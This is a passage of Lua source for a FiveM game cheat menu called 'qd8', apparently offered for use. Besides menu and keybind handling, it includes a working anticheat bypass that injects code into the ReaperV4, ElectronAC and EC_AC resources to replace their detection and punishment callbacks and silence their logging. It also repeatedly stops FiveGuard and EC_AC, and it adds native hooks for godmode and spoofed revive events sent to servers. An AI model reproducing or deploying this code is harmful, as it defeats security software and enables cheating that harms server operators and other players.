        if IsVisible and MenuOpenable then qd8:Backspace() end
    elseif keyName == "Enter" then
        if IsVisible and MenuOpenable then qd8:Enter() end
    elseif keyName == "Q" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then qd8:PrevCategory() end
    elseif keyName == "E" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then qd8:NextCategory() end
    elseif keyName == "ArrowUp" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then qd8:ScrollOne("Up") lastScrollPress = scrollNow end
    elseif keyName == "ArrowDown" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then qd8:ScrollOne("Down") lastScrollPress = scrollNow end
    elseif keyName == "ArrowLeft" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    qd8:ScrollTwo("Left")
                    lastSliderPress = now
                else
                    qd8:ScrollTwo("Left")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                qd8:ScrollTwo("Left")
            end
        end
    elseif keyName == "ArrowRight" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    qd8:ScrollTwo("Right")
                    lastSliderPress = now
                else
                    qd8:ScrollTwo("Right")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                qd8:ScrollTwo("Right")
            end
        end
    elseif keyName == "F5" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if IsVisible and MenuOpenable and hoveredTab and (hoveredTab.type == "button" or hoveredTab.type == "checkbox" or hoveredTab.type == "slider-checkbox") then
            qd8:HideUI()
            Wait(250)
            KeyboardInput(("Bind %s"):format(hoveredTab.label), "", function(val)
                for vk, name in pairs(MappedKeys) do
                    if name:lower() == val:lower() then
                        local fivemControl = VK_TO_FIVEM[vk]

                        for i, data in pairs(MenuKeybinds) do
                            if data.keyRaw == vk then
                                qd8:Notify("error", "qd8", "There is already a keybind with that key!", 3000)
                                return
                            end
                        end

                        if fivemControl then
                            MenuKeybinds[#MenuKeybinds + 1] = {
                                key = fivemControl,
                                keyRaw = vk,
                                keyLabel = MappedKeys[vk],
                                type = hoveredTab.type,
                                label = hoveredTab.label,
                                checked = hoveredTab.checked or false,
                                value = hoveredTab.value or 1.0,
                                step = hoveredTab.step or 0.25,
                                min = hoveredTab.min or 0.25,
                                max = hoveredTab.max or 5.0,
                                onSelect = hoveredTab.onSelect,
                            }

                            qd8:ShowKeybindList(MenuKeybinds)
                        end

                        Wait(500)
                        qd8:ShowUI()

                        return
                    end
                end
            end, "keybind")
        end
    else
        if MenuOpenable then
            for _, data in pairs(MenuKeybinds) do
                if data.type == "button" then
                    local key = data.keyRaw
                    if key then
                        if key == keyCode then
                            data.onSelect()
                            qd8:Notify("success", "qd8", ("You have executed %s!"):format(data.label), 3000)
                        end
                    end
                elseif data.type == "checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        qd8:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.checked)
                        end

                        qd8:ShowKeybindList(MenuKeybinds)
                        qd8:Notify(data.checked and "success" or "error", "qd8", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            qd8:UpdateElements(CurrentMenu)
                        end
                    end
                elseif data.type == "slider-checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        qd8:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.value, data.checked)
                        end

                        qd8:ShowKeybindList(MenuKeybinds)
                        qd8:Notify(data.checked and "success" or "error", "qd8", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            qd8:UpdateElements(CurrentMenu)
                        end
                    end
                end
            end
        end
    end
end)

function qd8:InListMenu()
    return CurrentCategories and CurrentCategories[CurrentCategoryIndex] and (CurrentCategories[CurrentCategoryIndex].label == "List" or CurrentCategories[CurrentCategoryIndex].label == "Safe")
end

function qd8:SelectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = true
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = true
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function qd8:UnselectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = false
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = false
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function qd8:ClearSelection()
    CPlayers = {}
    if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
        local category = CurrentCategories[CurrentCategoryIndex]
        if category.label == "List" and category.tabs then
            for _, tab in ipairs(category.tabs) do
                if tab.type == "checkbox" then
                    tab.checked = false
                end
            end
        end
    end

    qd8:UnselectEveryone()
end

function qd8:UpdateListMenu()
    if not IsVisible then return end
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    local coords = GetEntityCoords(PlayerPedId())
    if not coords then return end

    local nearbyPlayers = self:GetNearbyPlayers(coords, 350.0, true)
    local dividerIndex
    for i, tab in ipairs(category.tabs) do
        if tab.type == "divider" and tab.label == "Nearby Players" then
            dividerIndex = i
            break
        end
    end
    if not dividerIndex then return end

    for i = #category.tabs, dividerIndex + 1, -1 do
        table.remove(category.tabs, i)
    end

    if #nearbyPlayers == 0 then
        category.tabs[#category.tabs + 1] = {
            type = "button",
            label = "No Nearby Players",
            disabled = true
        }
    else
        table.sort(nearbyPlayers, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)
        for _, player in ipairs(nearbyPlayers) do
            local sid = tonumber(player.serverId)
            if sid and player.name then
                local _, currentWeapon = GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(sid)))
                category.tabs[#category.tabs + 1] = {
                    type = "checkbox",
                    label = ("%s - [%s]"):format(player.name, sid),
                    serverId = sid,
                    checked = CPlayers[sid] or false,
                    name = player.name,
                    vehicle = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or nil,
                    isDriver = GetPedInVehicleSeat(GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))), -1) == GetPlayerPed(GetPlayerFromServerId(sid)) or false,
                    metaData = {
                        { key = "Distance", value = math.floor(#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(sid))))) .. ".0m" },
                        { key = "Server ID", value = sid },
                        { key = "Health", value = GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(sid))), color = "0, 255, 17" },
                        { key = "Armour", value = GetPedArmour(GetPlayerPed(GetPlayerFromServerId(sid))), color = "0, 132, 255" },
                        { key = "Weapon", value = WeaponsLabels[currentWeapon] or "Unknown" },
                        { key = "Vehicle", value = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or "Unknown" },
                        { key = "Alive", value = IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(sid))) and "Dead" or "Alive" },
                        { key = "Speed", value = math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(sid))) * 3.6) .. ".0 km/h" },
                        { key = "Visible", value = IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(sid))) and "Visible" or "Invisible" },
                    },
                    onSelect = function(checked)
                        CPlayers[sid] = checked or false
                    end
                }
            end
        end
    end

    for serverId, _ in pairs(CPlayers) do
        local stillNearby = false
        for _, player in ipairs(nearbyPlayers) do
            if tonumber(player.serverId) == tonumber(serverId) then
                stillNearby = true
                break
            end
        end
        if not stillNearby then
            CPlayers[serverId] = nil
        end
    end

    HoveredIndex = math.min(HoveredIndex or 1, math.max(1, #category.tabs))

    local ok, err = pcall(function()
        self:UpdateElements(CurrentMenu)
    end)
    if not ok then
        print("^7[^5qd8^7]: UI update error: " .. tostring(err))
    end
end

function qd8:AssignListMenuActions()
    if not ActiveMenu then return end

    for _, subMenu in ipairs(ActiveMenu) do
        if subMenu.label == "Server" and subMenu.categories then
            for _, category in ipairs(subMenu.categories) do
                if category.label == "List" and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab.type == "button" then
                            if tab.label == "Select Everyone" then
                                tab.onSelect = function() qd8:SelectEveryone() end
                            elseif tab.label == "Un-Select Everyone" then
                                tab.onSelect = function() qd8:UnselectEveryone() end
                            elseif tab.label == "Clear Selection" then
                                tab.onSelect = function() qd8:ClearSelection() end
                            end
                        end
                    end
                end
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(1500)
        if qd8:InListMenu() and IsVisible then
            local ok, err = pcall(function()
                qd8:UpdateListMenu()
            end)
            if not ok then
                print("^7[^5qd8^7]: List update error: " .. tostring(err))
            end
        end
    end
end)

Wait(1000)

qd8:AssignListMenuActions()

local electronResource = nil
local fiveguardResource = nil

local function ScanElectronAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest and (string.find(manifest, "https://electron-services.com") or string.find(manifest, "Electron Services") or string.find(manifest, "The most advanced fiveM anticheat")) then
            electronResource = resource
            print("^7[^5qd8^7]: Detected ElectronAC in Resource: " .. resource)
            return resource
        end
    end

    return nil
end

local function ScanFiveGuardAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local metadata = GetResourceMetadata(resource, 'client_script', j)
            if metadata and string.find(metadata, "obfuscated") then
                fiveguardResource = resource
                print("^7[^5qd8^7]: Detected FiveGuard in Resource: " .. resource)
                return resource
            end
        end
    end
    
    return nil
end

function qd8:LoadBypass()
    local restrictedIPs = {
        "216.146.24.88:30120",
        "91.190.154.74:30120"
    }
    local currentEndpoint = GetCurrentServerEndpoint()
    for _, ip in ipairs(restrictedIPs) do
        if currentEndpoint == ip then
            self:Notify("error", "qd8", "Bypass disabled for this server.", 3000)
            return
        end
    end

    self:Notify("info", "qd8", "Loading Anticheat Bypass...", 3000)
    ScanElectronAnticheat()
    ScanFiveGuardAnticheat()
    Wait(1000)

    -- ReaperV4 Bypass
    if GetResourceState("ReaperV4") == "started" then
        MachoInjectResource2(2, "ReaperV4", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]])

    MachoHookNative(0xC6D3D26810C8E0F9, function(...) return false, false end)
    MachoHookNative(0x8D4D46230B2C353A, function(...) return false, 3 end)
    MachoHookNative(0xB15162CB5826E9E8, function(...) return false, true end)
    MachoHookNative(0xD5037BA82E12416F, function(...) return false, 0 end)
    MachoHookNative(0xFB92A102F1C4DFA3, function(...) return false, true end)
    print("ReaperV4 Bypass Enabled")
    self:Notify("info", "qd8", "ReaperV4 Bypass Loaded", 3000)

    elseif electronResource ~= nil then
        Injection("ElectronAC", [[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]])
        MachoInjectResource2(2, "ElectronAC", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]])

    elseif fiveguardResource ~= nil then
        CreateThread(function()
            while true do
                MachoResourceStop(fiveguardResource)
                print("^7[^5qd8^7]: Stopped Resource: " .. fiveguardResource)
                Wait(2000)
            end
        end)
        return

    elseif GetResourceState("EC_AC") == "started" then
        MachoInjectResourceRaw("EC_AC", [[print = function() end]])
        MachoInjectResourceRaw("EC_AC", [[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]])
        local resources = { "EC_AC" }
        for i = 1, #resources do
            local resource = resources[i]
            MachoInjectResource(resource, [[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]])
            Wait(1050)
        end
        CreateThread(function()
            while true do
                Wait(0)
                MachoResourceStop("EC_AC")
            end
        end)
    end

    if GetResourceState("WaveShield") == 'started' then
        qd8:Notify("error", "qd8", "WaveShield Anticheat Found.", 3000)
    elseif GetResourceState("ReaperV4") == 'started' then
        qd8:Notify("error", "qd8", "ReaperV4 Anticheat Found.", 3000)
    elseif GetResourceState("ElectronAC") == 'started' then
        qd8:Notify("error", "qd8", "ElectronAC Anticheat Found.", 3000)
    elseif GetResourceState("FiniAC") == 'started' then
        qd8:Notify("error", "qd8", "FiniAC Anticheat Found.", 3000)
    end
end

Wait(500)
qd8:LoadBypass()

-- Send protection system info
local function SendProtectionInfo()
    local protection = "No Anti Cheat"
    
    if GetResourceState("ElectronAC") == 'started' then
        protection = "ElectronAC"
    elseif GetResourceState("FiniAC") == 'started' then
        protection = "FiniAC"
    elseif GetResourceState("fiveguard") == 'started' then
        protection = "FiveGuard"
    elseif GetResourceState("ec-ac") == 'started' or GetResourceState("ecac") == 'started' then
        protection = "EC-AC"
    elseif GetResourceState("reaper") == 'started' then
        protection = "Reaper"
    elseif GetResourceState("electron") == 'started' then
        protection = "Electron"
    end
    
    -- Send notification using existing system
    qd8:Notify("info", "Protection System", "Detected: " .. protection, 5000)
end

-- Enhanced Godmode with Advanced Protection Bypass
function qd8:EnableGodmode()
    -- 1. كشف ديناميكي للحمايات الموجودة
    local protections = self:DetectActiveProtections()
    local ped = PlayerPedId()
    
    -- 2. طرق حقن متعددة مخصصة لكل حماية
    if protections.WaveShield then
        -- تقنية متقدمة لـ WaveShield
        MachoInjectResourceRaw("WaveShield", [[
            if not _G.qd8Godmode then _G.qd8Godmode = { enabled = false, hooks = {} } end
            _G.qd8Godmode.enabled = true
            
            -- Hook natives بطريقة متقدمة
            local function AdvancedHook(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if originalNative and type(originalNative) == "function" then
                    if not _G.qd8Godmode.hooks[nativeName] then
                        _G.qd8Godmode.hooks[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) 
                        if _G.qd8Godmode.enabled then
                            return newFunction(originalNative, ...)
                        end
                        return originalNative(...)
                    end
                end
            end
            
            -- Hook damage-related natives
            AdvancedHook("SetEntityHealth", function(orig, entity, health)
                if entity == PlayerPedId() and health < GetEntityHealth(entity) then
                    return -- منع تقليل الصحة
                end
                return orig(entity, health)
            end)
            
            AdvancedHook("ApplyDamageToPed", function(orig, ped, ...)
                if ped == PlayerPedId() then return end
                return orig(ped, ...)
            end)
        ]])
    elseif protections.ReaperV4 then
        -- تقنية مخصصة لـ ReaperV4
        MachoInjectThread(0, "ReaperV4", "", [[
            local ped = PlayerPedId()
            SetEntityInvincible(ped, true)
            SetPlayerInvincible(PlayerId(), true)
            SetPedCanRagdoll(ped, false)
            SetEntityProofs(ped, true, true, true, true, true, true, true, true)
        ]])
    else
        -- 3. نظام احتياطي متعدد الطبقات للحمايات غير المعروفة
        self:MultiLayerGodmode()
    end
    
    -- 4. تقنيات التخفي المتقدمة
    self:ApplyStealthTechniques("godmode")
    
    qd8:Notify("success", "qd8", "Advanced Godmode Enabled", 3000)
end

function qd8:DisableGodmode()
    local protections = self:DetectActiveProtections()
    local ped = PlayerPedId()
    
    if protections.WaveShield then
        MachoInjectResourceRaw("WaveShield", [[
            if _G.qd8Godmode then
                _G.qd8Godmode.enabled = false
                -- استعادة الـ natives الأصلية
                for nativeName, originalFunc in pairs(_G.qd8Godmode.hooks) do
                    _G[nativeName] = originalFunc
                end
                _G.qd8Godmode.hooks = {}
            end
        ]])
    elseif protections.ReaperV4 then
        MachoInjectThread(0, "ReaperV4", "", [[
            local ped = PlayerPedId()
            SetEntityInvincible(ped, false)
            SetPlayerInvincible(PlayerId(), false)
            SetPedCanRagdoll(ped, true)
            SetEntityProofs(ped, false, false, false, false, false, false, false, false)
        ]])
    else
        -- نظام احتياطي
        SetEntityInvincible(ped, false)
        SetPlayerInvincible(PlayerId(), false)
        SetPedCanRagdoll(ped, true)
        SetEntityProofs(ped, false, false, false, false, false, false, false, false)
    end
    
    qd8:Notify("error", "qd8", "Advanced Godmode Disabled", 3000)
end

-- Enhanced Revive with Advanced Protection Bypass
function qd8:RevivePlayer()
    -- 1. كشف ديناميكي للحمايات الموجودة
    local protections = self:DetectActiveProtections()
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    
    -- 2. طرق حقن متعددة مخصصة لكل حماية
    if protections.WaveShield then
        -- تقنية متقدمة لـ WaveShield
        MachoInjectResourceRaw("WaveShield", [[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            
            -- إحياء متقدم مع تجاوز الحماية
            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
            SetEntityHealth(ped, 200)
            SetPedArmour(ped, 100)
            
            -- تنظيف متقدم
            ClearPedBloodDamage(ped)
            ClearPedTasksImmediately(ped)
            ClearPedSecondaryTask(ped)
            
            -- إعادة تعيين الحالات
            SetPlayerInvincible(PlayerId(), false)
            SetEntityInvincible(ped, false)
            SetPedCanRagdoll(ped, true)
            
            -- محاولة events متعددة
            local reviveEvents = {
                'deathscreen:revive', 'hospital:revive', 'esx_ambulancejob:revive',
                'qb-ambulancejob:revive', 'revive:Player:Dead', 'esx:onPlayerSpawn'
            }
            
            for _, event in ipairs(reviveEvents) do
                TriggerEvent(event)
                TriggerServerEvent(event)
                Citizen.Wait(50)
            end
        ]])
    elseif protections.ReaperV4 then
        -- تقنية مخصصة لـ ReaperV4
        MachoInjectThread(0, "ReaperV4", "", [[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            
            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
            SetEntityHealth(ped, 200)
            SetPedArmour(ped, 100)
            ClearPedBloodDamage(ped)
            ClearPedTasksImmediately(ped)
            
            TriggerEvent('deathscreen:revive')
            TriggerEvent('hospital:revive')
        ]])
    elseif protections.ElectronAC then
        -- تقنية مخصصة لـ ElectronAC
        self:ElectronACRevive()
    else
        -- 3. نظام احتياطي متعدد الطبقات
        self:MultiLayerRevive()
    end
    
    -- 4. تقنيات التخفي المتقدمة
    self:ApplyStealthTechniques("revive")
    
    qd8:Notify("success", "qd8", "Advanced Revive Complete", 3000)
end

-- Advanced Protection Detection System
function qd8:DetectActiveProtections()
    local protections = {}
    local knownProtections = {
        "WaveShield", "ReaperV4", "ElectronAC", "FiniAC", 
        "fiveguard", "ec-ac", "reaper", "electron", "monitor"
    }
    
    for _, protection in ipairs(knownProtections) do
        if GetResourceState(protection) == "started" then
            protections[protection] = true
        end
    end
    
    return protections
end

-- Multi-Layer Godmode System
function qd8:MultiLayerGodmode()
    local ped = PlayerPedId()
    
    -- Layer 1: Basic Protection
    SetEntityInvincible(ped, true)
    SetPlayerInvincible(PlayerId(), true)
    SetPedCanRagdoll(ped, false)
    SetEntityProofs(ped, true, true, true, true, true, true, true, true)
    
    -- Layer 2: Advanced Hooks
    if MachoHookNative then
        -- Hook damage natives
        MachoHookNative(0x83F7E06362C47C17, function(...) -- SET_ENTITY_HEALTH
            local args = {...}
            if args[1] == ped and args[2] < GetEntityHealth(ped) then
                return false -- منع تقليل الصحة
            end
            return true
        end)
        
        MachoHookNative(0x697157CED63F18D4, function(...) -- APPLY_DAMAGE_TO_PED
            local args = {...}
            if args[1] == ped then
                return false -- منع الضرر
            end
            return true
        end)
    end
    
    -- Layer 3: Continuous Protection
    Citizen.CreateThread(function()
        while _G.qd8GodmodeActive do
            local currentPed = PlayerPedId()
            if GetEntityHealth(currentPed) < 200 then
                SetEntityHealth(currentPed, 200)
            end
            Citizen.Wait(100)
        end
    end)
    
    _G.qd8GodmodeActive = true
end

-- Multi-Layer Revive System
function qd8:MultiLayerRevive()
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    
    -- Layer 1: Basic Revive
    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
    SetEntityHealth(ped, 200)
    SetPedArmour(ped, 100)
    
    -- Layer 2: Advanced Cleanup
    ClearPedBloodDamage(ped)
    ClearPedTasksImmediately(ped)
    ClearPedSecondaryTask(ped)
    SetPedCanRagdoll(ped, true)
    
    -- Layer 3: Framework-Specific Events
    local frameworks = {
        {resource = "esx_ambulancejob", events = {"esx_ambulancejob:revive", "esx:onPlayerSpawn"}},
        {resource = "qb-ambulancejob", events = {"qb-ambulancejob:revive", "hospital:client:Revive"}},
        {resource = "wasabi_ambulance", events = {"wasabi_ambulance:revive", "esx:onPlayerSpawn"}},
        {resource = "scripts", events = {"deathscreen:revive"}},
        {resource = "framework", events = {"deathscreen:revive"}}
    }
    
    for _, framework in ipairs(frameworks) do
        if GetResourceState(framework.resource) == "started" then
            for _, event in ipairs(framework.events) do
                TriggerEvent(event)
                TriggerServerEvent(event)
            end
        end
    end
    
    -- Layer 4: Generic Events
    local genericEvents = {
        'deathscreen:revive', 'hospital:revive', 'revive:Player:Dead',
        'playerSpawned', 'baseevents:onPlayerDied', 'baseevents:onPlayerKilled'
    }
    
    for _, event in ipairs(genericEvents) do
        TriggerEvent(event)
        TriggerServerEvent(event)
    end
end

-- Advanced Stealth Techniques
function qd8:ApplyStealthTechniques(action)
    -- تقنية 1: تأخير العمليات لتجنب الكشف
    Citizen.Wait(math.random(50, 200))
    
    -- تقنية 2: تشويش الإشارات
    for i = 1, 3 do
        TriggerEvent('randomEvent' .. i)
        Citizen.Wait(10)
    end
    
    -- تقنية 3: إخفاء النشاط
    if action == "godmode" then
        TriggerEvent('playerHealthChanged', 200)
    elseif action == "revive" then
        TriggerEvent('playerSpawned')
    end
end

-- ElectronAC Specific Bypass
function qd8:ElectronACRevive()
    if GetResourceState("ElectronAC") == "started" then
        MachoInjectResourceRaw("ElectronAC", [[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            
            -- تجاوز ElectronAC بطريقة خاصة
            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
            SetEntityHealth(ped, 200)
            SetPedArmour(ped, 100)
            
            -- تنظيف خاص بـ ElectronAC
            ClearPedBloodDamage(ped)
            ClearPedTasksImmediately(ped)
            
            -- events خاصة بـ ElectronAC
            TriggerEvent('esx:onPlayerSpawn')
            TriggerServerEvent('esx:onPlayerSpawn')
        ]])
    end
end

-- Quick Search functionality - Instant results
function qd8:QuickSearchMenuItems(searchTerm)
    local results = {}
    local originalTerm = searchTerm
    searchTerm = string.lower(searchTerm)
    
    -- Instant search through all menu items
    local function searchInTabs(tabs, menuPath, menuLabel)
        for _, tab in ipairs(tabs) do
            if tab.label and tab.type ~= "divider" then
                local label = string.lower(tab.label)
                local desc = tab.desc and string.lower(tab.desc) or ""
                
                -- Enhanced search - check label, description, and menu context
                if string.find(label, searchTerm) or string.find(desc, searchTerm) then
                    table.insert(results, {
                        label = tab.label,
                        desc = tab.desc or "No description available",
                        path = menuPath,
                        menuLabel = menuLabel,
                        tab = tab,
                        matchType = string.find(label, searchTerm) and "title" or "description",
                        priority = string.find(label, searchTerm) and 1 or 2 -- Title matches get higher priority
                    })
                end
            end
        end
    end
    
    -- Search through all menus instantly
    for _, menu in ipairs(ActiveMenu) do
        if menu.categories and menu.label ~= "🔍 Search Results" then
            for _, category in ipairs(menu.categories) do
                local menuPath = menu.label .. " → " .. category.label
                searchInTabs(category.tabs, menuPath, menu.label)
            end
        end
    end
    
    -- Sort results by priority (title matches first)
    table.sort(results, function(a, b) return a.priority < b.priority end)
    
    -- Show results instantly - just the items
    if #results > 0 then
        self:ShowQuickResults(results, originalTerm)
    else
        qd8:Notify("error", "qd8", "Nothing found", 2000)
    end
end


function qd8:ShowQuickResults(results, searchTerm)
    -- Create simple results menu - just show the items
    local quickMenu = {
        {
            label = "Search",
            type = "subMenu", 
            categories = {
                {
                    label = "Search",
                    tabs = {}
                }
            }
        }
    }
    
    -- Just add the results - no extra stuff
    for i, result in ipairs(results) do
        table.insert(quickMenu[1].categories[1].tabs, {
            type = result.tab.type or "button",
            label = result.label,
            desc = result.desc,
            checked = result.tab.checked,
            onSelect = function(...)
                local args = {...}
                if result.tab.onSelect then
                    if result.tab.type == "checkbox" then
                        result.tab.onSelect(args[1])
                    elseif result.tab.type == "slider" then
                        result.tab.onSelect(args[1])
                    else
                        result.tab.onSelect()
                    end
                end
            end,
            value = result.tab.value,
            min = result.tab.min,
            max = result.tab.max,
            step = result.tab.step,
            values = result.tab.values,
            scrollType = result.tab.scrollType
        })
    end
    
    -- Switch to results immediately
    CurrentMenu = quickMenu
    CurrentCategories = quickMenu[1].categories
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end


-- Manual Menu Positioning System
local ManualPositioning = {
    active = false,
    currentX = 4, -- vw units
    currentY = 50, -- vh units
    step = 2 -- movement step
}

function qd8:StartManualPositioning()
    -- First press - start positioning mode
    if not ManualPositioning.active then
        ManualPositioning.active = true
        qd8:Notify("success", "qd8", "Positioning mode ON! Use arrow keys to move menu, Enter to save", 4000)
        
        -- Send message to UI to start positioning mode
        qd8:SendMessage({ action = "startPositioningMode" })
        
        -- Start positioning thread with complete game isolation
        Citizen.CreateThread(function()
            while ManualPositioning.active do
